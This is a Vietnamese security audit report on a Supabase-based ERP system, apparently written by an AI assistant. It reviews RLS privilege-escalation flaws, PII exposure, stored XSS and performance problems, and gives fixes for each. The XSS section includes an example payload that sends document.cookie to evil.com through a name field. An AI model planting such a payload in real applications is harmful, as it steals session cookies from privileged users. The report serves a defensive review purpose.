# Báo cáo rà soát lỗi & tối ưu — ERP AIS

Phạm vi: toàn bộ mã nguồn `app/` (HTML/JS thuần + Supabase) và các file schema/RLS (`01_*.sql` → `09_seed_data.sql`, `supabase_migrations_10_additional_rls.sql`, edge function `create-employee-account`).

Cách đọc báo cáo: xếp theo mức độ nghiêm trọng. **Mục 1–5 nên sửa trước khi đưa vào dùng thật**, vì đây là lỗ hổng bảo mật/khiến nghiệp vụ chạy sai, không phải chỉ là "tối ưu".

---

## A. NGHIÊM TRỌNG — Bảo mật & toàn vẹn dữ liệu

### 1. Bảng `employees` lộ toàn bộ PII cho bất kỳ ai, kể cả chưa đăng nhập
`08_rls_policies.sql`:
```sql
create policy employees_select_all on employees for select using (true);
```
`using (true)` không kiểm tra `auth.uid()`, nghĩa là **ai cầm được anon key (chính là key đang hard-code công khai trong `app/js/supabase.js`) cũng SELECT được toàn bộ bảng `employees`** — bao gồm `id_card_number` (CMND/CCCD), `dob`, `hometown`, `address`, `phone`, `emergency_contact_*`, `signature_url` — mà **không cần đăng nhập**.

→ Ý định ban đầu ("ai cũng xem được để chọn người mời họp/gán việc") là đúng, nhưng chỉ nên đúng cho **nhân viên đã đăng nhập**, và chỉ với **một số cột cơ bản** (tên, mã NV, phòng ban, avatar), không phải toàn bộ cột.

**Sửa đề xuất:**
```sql
drop policy employees_select_all on employees;

create policy employees_select_basic on employees for select
  to authenticated
  using (true);
```
Và tách các cột nhạy cảm (`id_card_number`, `dob`, `hometown`, `address`, `emergency_contact_*`) ra một bảng phụ `employee_private_info` với RLS riêng (chỉ chính chủ + HR + Executive/Tech), hoặc dùng `security_invoker` view chỉ lộ cột cần thiết cho các trang dropdown/chọn người.

---

### 2. Nhân viên có thể tự nâng quyền cho chính mình
```sql
create policy employees_update_self on employees for update
  using (auth_user_id = auth.uid());
```
Postgres RLS là **row-level**, không phải column-level. Vì policy không giới hạn cột, và không có `with check` khác với `using`, nên khi tự sửa hồ sơ, một nhân viên STAFF có thể tự PATCH thẳng:
- `role_id` → đổi thành EXECUTIVE/TECH (chiếm toàn quyền hệ thống)
- `department_id`, `center_id` → nhảy phòng ban
- `status` → tự kích hoạt lại tài khoản đã bị khoá
- `employee_code`, `temp_password_flag`, `signature_url` của chính mình theo ý muốn

Đây là lỗi leo thang đặc quyền (privilege escalation) nghiêm trọng nhất trong hệ thống. Vì gọi trực tiếp Supabase REST API bằng anon key + JWT, không qua UI, nên chỉ cần mở DevTools là khai thác được, form ở `profile.js` không bảo vệ được gì cả.

**Sửa đề xuất** — chặn ở tầng DB bằng trigger, không chỉ dựa vào RLS:
```sql
create or replace function prevent_self_privilege_escalation() returns trigger as $$
begin
  if auth.uid() = old.auth_user_id and not is_executive_or_tech() and not (
    current_department_id() = (select id from departments where code='HR')
    and current_role_code() in ('DEPT_HEAD','DEPT_DEPUTY')
  ) then
    if new.role_id is distinct from old.role_id
       or new.department_id is distinct from old.department_id
       or new.center_id is distinct from old.center_id
       or new.status is distinct from old.status
       or new.employee_code is distinct from old.employee_code
       or new.temp_password_flag is distinct from old.temp_password_flag then
      raise exception 'Không được phép tự thay đổi trường này.';
    end if;
  end if;
  return new;
end;
$$ language plpgsql security definer;

create trigger employees_guard_self_update
before update on employees
for each row execute function prevent_self_privilege_escalation();
```

---

### 3. Nhân viên có thể tự duyệt hồ sơ tài chính/HR của chính mình
Áp dụng cho: `contracts_update`, `payment_requests_update`, `advance_requests_update`, `event_proposals_update`, `purchase_requests_update` (trong `supabase_migrations_10_additional_rls.sql`). Mẫu chung:
```sql
create policy payment_requests_update on payment_requests for update
  using (
    requester_id = current_employee_id()
    or (current_department_id() = ... and current_role_code() in (...))
    or is_executive_or_tech()
  );
-- không có "with check" riêng
```
Khi không có `with check` riêng, Postgres dùng lại `using` để kiểm tra **cả dòng mới**. Vì `requester_id` không đổi, điều kiện `requester_id = current_employee_id()` vẫn đúng sau update → **người tạo phiếu được phép sửa bất kỳ cột nào**, kể cả `status`, `*_signed_by`, `*_signed_at`, số tiền đề nghị. Toàn bộ luồng ký duyệt nhiều cấp (nhân viên → trưởng phòng → ban điều hành) hiện **chỉ được đảm bảo bởi giao diện `pdfEditor.js`**, không được đảm bảo bởi database — ai đó gọi thẳng API vẫn tự duyệt tạm ứng/thanh toán/mua sắm cho chính mình được. Đây là rủi ro thất thoát tiền thực tế, không chỉ lý thuyết.

**Sửa đề xuất** — cách chắc nhất là dùng trigger kiểm tra **chuyển trạng thái hợp lệ theo vai trò** (state machine ở DB), tương tự mẫu #2. Quy tắc gợi ý:
- `requester_id = current_employee_id()` chỉ được sửa khi `old.status = 'draft'` (trước khi nộp).
- Chuyển `submitted → approved_1` chỉ role trưởng phòng phụ trách.
- Chuyển `approved_1 → approved_2` chỉ `EXECUTIVE`/`TECH`.
- Không ai được set `*_signed_by` khác chính `current_employee_id()`.

---

### 4. Bất kỳ ai cũng insert được hợp đồng lao động cho bất kỳ nhân viên nào
```sql
create policy contracts_insert on contracts for insert
  with check (true); -- mọi nhân viên có thể khởi tạo hợp đồng cho chính mình/người khác qua HR
```
`with check (true)` nghĩa là **không kiểm tra gì cả** — một STAFF bất kỳ có thể INSERT một dòng `contracts` với `employee_id` là người khác, mức lương/loại hợp đồng tuỳ ý. Comment ghi "qua HR" nhưng code không hề giới hạn theo HR.

**Sửa:**
```sql
create policy contracts_insert on contracts for insert
  with check (
    employee_id = current_employee_id()
    or (current_department_id() = (select id from departments where code='HR')
        and current_role_code() in ('DEPT_HEAD','DEPT_DEPUTY'))
    or is_executive_or_tech()
  );
```

---

### 5. Lỗi chức năng: Duyệt đơn nghỉ phép / công tác **không hoạt động** trên production
`08_rls_policies.sql` chỉ tạo `leave_select`, `leave_insert`, `trips_select`, `trips_insert` — **không có policy UPDATE nào cho `leave_requests` và `business_trips`**, kể cả trong `supabase_migrations_10_additional_rls.sql` (file này có bổ sung UPDATE cho contracts/payment/advance/event/purchase nhưng quên leave_requests và business_trips).

Vì RLS mặc định **deny-by-default**, câu lệnh `.update({status, approved_by, approved_at})` trong `app/hr/leave-requests.js` (dòng ~87–107) sẽ **âm thầm cập nhật 0 dòng** (Supabase không trả lỗi, chỉ trả về mảng rỗng) — nút "Duyệt" trông như chạy được nhưng **không đổi trạng thái, không trừ ngày phép**. Đây là lỗi chức năng cốt lõi của module Nhân sự, cần bổ sung ngay:

```sql
create policy leave_update on leave_requests for update
  using (
    (employee_id = current_employee_id() and status = 'draft')
    or current_department_id() = (select id from departments where code='HR')
    or is_executive_or_tech()
  );

create policy trips_update on business_trips for update
  using (
    (employee_id = current_employee_id() and status = 'draft')
    or current_department_id() = (select id from departments where code='HR')
    or is_executive_or_tech()
  );
```

---

## B. LỖI LOGIC — Sai kết quả / không nhất quán dữ liệu

### 6. Trừ ngày phép không atomic → dễ mất đồng bộ dữ liệu
`app/hr/leave-requests.js`, hàm `decide()`:
```js
await supabase.from('leave_requests').update({ status, approved_by, approved_at });
// ...sau đó, tách rời hoàn toàn...
const bal = await supabase.from('leave_balances').select(...);
await supabase.from('leave_balances').update({ annual_leave_used: bal.annual_leave_used + row.days });
```
Đây là 2 request HTTP riêng biệt, không có transaction. Nếu mất mạng/đóng tab giữa 2 bước, hoặc HR bấm "Duyệt" 2 lần liên tiếp (không thấy code disable nút trong lúc chờ), đơn được duyệt nhưng ngày phép không bị trừ (hoặc bị trừ 2 lần — kiểu "đọc rồi ghi" (`read-modify-write`) này không an toàn khi có 2 lần bấm gần nhau).

**Sửa đề xuất:** chuyển toàn bộ logic duyệt + trừ phép vào 1 Postgres function (`security definer`), gọi qua `supabase.rpc('approve_leave_request', { id })`, dùng `update ... set annual_leave_used = annual_leave_used + :days` (cộng dồn tại DB, không đọc-rồi-ghi) trong cùng 1 transaction.

### 7. Đếm thông báo chưa đọc sai công thức
`app/js/dashboard.js`:
```js
const { count: total } = await supabase.from('notifications').select('id', { count: 'exact', head: true });
const { count: read } = await supabase.from('notification_reads').select('notification_id', { count: 'exact', head: true }).eq('employee_id', profile.id);
const unread = Math.max((total ?? 0) - (read ?? 0), 0);
```
`unread = tổng số thông báo nhìn thấy được − tổng số bản ghi đã đọc của mình`. Đây không phải là số thông báo chưa đọc thực sự — chỉ đúng tình cờ nếu không bao giờ có bản ghi "đã đọc" nào cho thông báo đã bị xoá/hết phạm vi. Cách tính đúng phải là đếm thông báo **không tồn tại** bản ghi đọc tương ứng:
```sql
create or replace function unread_notification_count() returns integer
language sql stable security definer as $$
  select count(*)::int from notifications n
  where (n.scope = 'system'
      or (n.scope='center' and n.center_id = current_center_id())
      or (n.scope='department' and n.department_id = current_department_id())
      or (n.scope='personal' and n.target_employee_id = current_employee_id()))
    and not exists (
      select 1 from notification_reads r
      where r.notification_id = n.id and r.employee_id = current_employee_id()
    );
$$;
```
Gọi 1 lần bằng `supabase.rpc('unread_notification_count')` — vừa đúng, vừa nhanh hơn 2 round-trip hiện tại. (README của bạn cũng đã tự ghi chú đây là chỗ cần thay bằng RPC — xác nhận đúng là cần làm.)

---

## C. RỦI RO BẢO MẬT KHÁC (mức trung bình)

### 8. XSS lưu trữ (stored XSS) lặp lại ở ~171 chỗ trong 90 file
Mẫu lặp lại khắp nơi (`profile.js`, `notifications.js`, `taskAssignments.js`, `broadcast.js`, `contracts.js`, `edu/*.js`, `teacher/*.js`...):
```js
sel.innerHTML = (employees || []).map(e => `<option value="${e.id}">${e.employee_code} — ${e.full_name}</option>`).join('');
```
`full_name`, nội dung thông báo, tiêu đề đề xuất, ghi chú... đều là dữ liệu **người dùng tự nhập** và được chèn thẳng vào `innerHTML`. Một nhân viên đổi tên mình (ở `profile.html`) thành `<img src=x onerror=fetch('//evil.com?c='+document.cookie)>` thì đoạn script này **chạy trong trình duyệt của Ban điều hành/HR** mỗi khi tên đó xuất hiện ở dropdown chọn người, danh sách hồ sơ, thông báo... — vì đây là hệ thống nội bộ có phân quyền cao (Executive xem hết), thiệt hại tiềm năng lớn hơn XSS trên site công khai thông thường.

**Sửa:** viết 1 hàm escape dùng chung, áp dụng cho mọi chỗ nội suy dữ liệu người dùng vào HTML:
```js
export function esc(s) {
  return String(s ?? '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
}
```
rồi `... ${esc(e.full_name)} ...` ở tất cả các chỗ liệt kê ở trên. Việc này cần sửa đồng loạt (grep `innerHTML` để rà từng file), không phải 1-2 chỗ.

### 9. Edge Function `create-employee-account`
- `randomTempPassword()` dùng `Math.random()` — không phải CSPRNG, và độ dài/độ phức tạp không đảm bảo (có thể sinh ra chuỗi ngắn hơn dự kiến do `slice(-6)` sau khi convert base36 có thể mất số 0 ở đầu). Nên dùng `crypto.getRandomValues` (Deno có sẵn `crypto`) và ép đủ độ dài + có chữ hoa/số.
- `admin.from('employees').insert({ ...employee, ... })`: spread thẳng body người gọi gửi lên vào insert — **mass assignment**. Người gọi (dù đã được xác thực là HR/Executive) có thể gửi kèm các field không nên tự set như `role_id`, `id`, `employee_code`. Nên whitelist rõ field được phép: `full_name, department_id, position_id, center_id, phone, ...` và luôn ép `status`, `temp_password_flag`, `auth_user_id` ở phía server, không nhận từ client.
- Không có CORS header (`Access-Control-Allow-Origin`, xử lý `OPTIONS`) — khi gọi trực tiếp từ trình duyệt qua `supabase.functions.invoke(...)`, một số cấu hình sẽ bị chặn bởi CORS preflight ở production. Nên thêm block CORS chuẩn của Supabase Edge Functions.

### 10. Bucket Storage `attachments` đang Public + `getPublicUrl`
Chính README đã tự ghi nhận (mục 10) là đang dùng Public bucket cho hồ sơ nghỉ phép, hợp đồng, chứng từ... Bất kỳ ai đoán được/lấy được URL file (URL không có gì bí mật, dễ bị liệt kê hoặc lộ qua log) đều tải được file — kể cả người ngoài hệ thống, vì Public bucket không qua RLS. Cần chuyển bucket sang **Private** + `createSignedUrl` (hết hạn sau vài phút) trước khi dùng thật, không chỉ "khi triển khai thật" như ghi chú — vì hồ sơ nghỉ phép/hợp đồng chứa thông tin nội bộ nhạy cảm.

---

## D. TỐI ƯU HIỆU NĂNG

### 11. Không phân trang ở bất kỳ đâu
Toàn bộ code quét được: **0 chỗ dùng `.range()`**, chỉ **1 chỗ dùng `.limit()`**, trong khi có **16 chỗ dùng `select('*')`**. Nghĩa là mọi trang danh sách (nhân viên, kho lưu trữ, thông báo, hợp đồng, đơn từ...) đang tải **toàn bộ bảng** về trình duyệt mỗi lần mở trang. Với vài chục nhân viên thì không sao, nhưng `archive_files`, `notifications`, `activity_logs` sẽ phình rất nhanh theo thời gian sử dụng thực tế → trang sẽ chậm dần, tốn băng thông, và tăng rủi ro ở mục A.1/C.8 vì kéo luôn các cột không cần thiết.

**Đề xuất:** thêm `.range(from, to)` + `count: 'estimated'` cho các bảng lớn (archive_files, notifications, activity_logs, students, leads), chỉ `select` đúng cột cần hiển thị thay vì `select('*')`.

### 12. Thiếu index trên nhiều khoá ngoại
Đếm nhanh trong các file schema: số `references` (khoá ngoại) nhiều hơn hẳn số `create index` tương ứng, ví dụ `03_hr_schema.sql` có 11 khoá ngoại nhưng chỉ 3 index, `05_mkt_facilities_schema.sql` 21 khoá ngoại / 4 index. PostgreSQL **không tự tạo index cho cột FK**. Các cột hay dùng để lọc/join nhưng có khả năng chưa có index cần rà lại, ít nhất:
- `leave_requests.employee_id`, `business_trips.employee_id`
- `payment_requests.requester_id`, `advance_requests.requester_id`
- `notifications.center_id`, `notifications.department_id`, `notifications.target_employee_id` (dùng liên tục trong policy `notifications_select` — mỗi lần SELECT đều phải quét)
- `classes.center_id`, `classes.teacher_id`, `students.center_id`
- `meeting_participants.employee_id`, `meeting_participants.meeting_id`

Thiếu index ở đúng những cột được dùng trong RLS policy (chạy trên **mọi** câu query của bảng đó) sẽ khiến chi phí RLS nhân lên đáng kể khi dữ liệu lớn dần.

### 13. Các hàm helper RLS gọi lại `select ... from departments where code='HR'` nhiều lần
Rất nhiều policy lặp lại subquery `(select id from departments where code='HR')` (hoặc ACC/MKT/FAC) thay vì cache 1 lần. Có index unique trên `departments.code` nên chi phí từng lần không lớn, nhưng với ~10 policy dùng chung mẫu này trên mỗi bảng, mỗi query đều phải chạy lại subquery đó. Nên đổi thành hàm `security definer` bất biến trong 1 transaction hoặc dùng `stable` function + cache:
```sql
create or replace function dept_id(dept_code text) returns uuid
language sql stable as $$ select id from departments where code = dept_code $$;
```
rồi gọi `dept_id('HR')` — dễ đọc hơn và Postgres có thể tối ưu tốt hơn với `stable`.

---

## E. GHI CHÚ NHỎ / DỌN CODE

- `app/js/supabase.js`: key anon thật đang hard-code làm giá trị fallback (`window.__ENV__?.SUPABASE_URL || '...'`). Bản thân anon key public là an toàn theo thiết kế, nhưng nên **tách project Supabase riêng cho dev/staging và production**, tránh trường hợp code demo/test lỡ tay thao tác nhầm trên dữ liệu thật — nhất là khi mục A vẫn còn lỗ hổng leo quyền.
- Nhiều trang module còn thiếu (`exec/orders.html`, `edu/teachers.html`, `mkt/expense-reports.html`...) — theo chính README — sẽ 404 khi bấm vào từ sidebar; nên ẩn các menu item chưa có trang thay vì để user bấm vào rồi vỡ trải nghiệm.
- `randomTempPassword()` và mật khẩu tạm gửi thẳng trong response — chấp nhận được vì HR là người đọc trực tiếp 1 lần, nhưng nên đảm bảo FE không `console.log` giá trị này (đã có TODO trong code, nhắc lại để không quên khi code phần HR nhận kết quả).

---

## Tóm tắt ưu tiên xử lý

| # | Vấn đề | Loại | Ưu tiên |
|---|---|---|---|
| 1 | `employees` lộ PII cho người chưa đăng nhập | Bảo mật | 🔴 Ngay lập tức |
| 2 | Tự nâng quyền qua `employees_update_self` | Bảo mật | 🔴 Ngay lập tức |
| 4 | `contracts_insert` cho phép chèn tuỳ ý | Bảo mật | 🔴 Ngay lập tức |
| 3 | Tự duyệt phiếu tài chính/HR của chính mình | Bảo mật | 🔴 Ngay lập tức |
| 5 | Duyệt nghỉ phép/công tác không hoạt động (thiếu policy UPDATE) | Lỗi chức năng | 🔴 Ngay lập tức |
| 8 | Stored XSS qua `innerHTML` (~171 chỗ) | Bảo mật | 🟠 Trước khi go-live |
| 6 | Trừ phép không atomic | Lỗi logic | 🟠 Trước khi go-live |
| 9 | Edge function: mass assignment, RNG yếu, thiếu CORS | Bảo mật | 🟠 Trước khi go-live |
| 10 | Storage bucket Public cho tài liệu nội bộ | Bảo mật | 🟠 Trước khi go-live |
| 7 | Sai công thức đếm thông báo chưa đọc | Lỗi logic | 🟡 Nên sửa sớm |
| 11–13 | Thiếu phân trang, thiếu index, subquery lặp | Hiệu năng | 🟡 Trước khi có dữ liệu thật lớn |

Mình có thể bắt tay sửa trực tiếp các mục 🔴 trước (viết lại file SQL migration mới + patch các file JS liên quan) nếu bạn muốn — cho mình biết bạn muốn ưu tiên phần nào trước.
